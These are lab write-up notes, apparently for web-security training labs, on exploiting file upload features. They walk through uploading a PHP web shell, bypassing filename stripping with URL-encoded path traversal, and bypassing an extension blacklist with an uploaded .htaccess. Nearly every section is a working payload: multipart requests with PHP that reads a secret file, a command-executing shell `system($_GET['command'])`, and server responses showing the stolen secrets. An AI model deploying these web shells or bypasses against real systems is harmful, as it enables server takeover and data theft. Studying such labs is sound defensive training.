# Lab: Remote code execution via web shell upload

Changed the file uploaded to .php extension with Content-Type and the shell that will echo the content of the secret:
```http
------WebKitFormBoundaryzoIAY8Fkq5CCKRxU
Content-Disposition: form-data; name="avatar"; filename="burp-suite-icon.php"
Content-Type: application/x-httpd-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
```

After the change when we go back to my-account page there is an http request for the file, which then gets ran in the server and we get the response:
```
HTTP/1.1 200 OK
...
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 32

FDgHaQRlAm6WYGUmYPmR1DzA53JOENZo -> secret
```

A more versatile web shell may look something like this:
```php
<?php echo system($_GET['command']); ?>
```
This script enables you to pass an arbitrary system command via a query parameter as follows:
```http
GET /example/exploit.php?command=id HTTP/1.1
```

# Lab: Web shell upload via path traversal

When uploading the php web shell we see that when we request the file later we get the text inside and the script does not ran.
```http
------WebKitFormBoundaryzoIAY8Fkq5CCKRxU
Content-Disposition: form-data; name="avatar"; filename="burp-suite-icon.php"
Content-Type: application/x-httpd-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
```
in order to use the path traversal we will send:
```http
------WebKitFormBoundaryzoIAY8Fkq5CCKRxU
Content-Disposition: form-data; name="avatar"; filename="../burp-suite-icon.php"
Content-Type: application/x-httpd-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
```

This did not work as the output is still "uploaded to avatars/burp-suite-icon.php". This suggests that there is a strip of our filename, now lets use encode url of this filename:
```http
------WebKitFormBoundaryzoIAY8Fkq5CCKRxU
Content-Disposition: form-data; name="avatar"; filename="%2e%2e%2f%62%75%72%70%2d%73%75%69%74%65%2d%69%63%6f%6e%2e%70%68%70"
Content-Type: application/x-httpd-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
```
And then we see that when we try to access my-account we get a request for "/files/avatars/..%2fburp-suite-icon.php"
which results in:
```http
HTTP/1.1 200 OK
...
Connection: close
Content-Length: 32

gkhUTC63b0CGmmoJodvFiyygH80J3QDa -> secret
```

# Lab: Web shell upload via extension blacklist bypass

We see we cannot upload .php files and so we add .htaccess to map another type of extensions to run.
First we upload:

```http
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: text/plain


AddType application/x-httpd-php .l33t
```

After that I upload the newly php mapped file:
```
Content-Disposition: form-data; name="avatar"; filename="burp-suite-icon.l33t"
Content-Type: application/x-httpd-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
```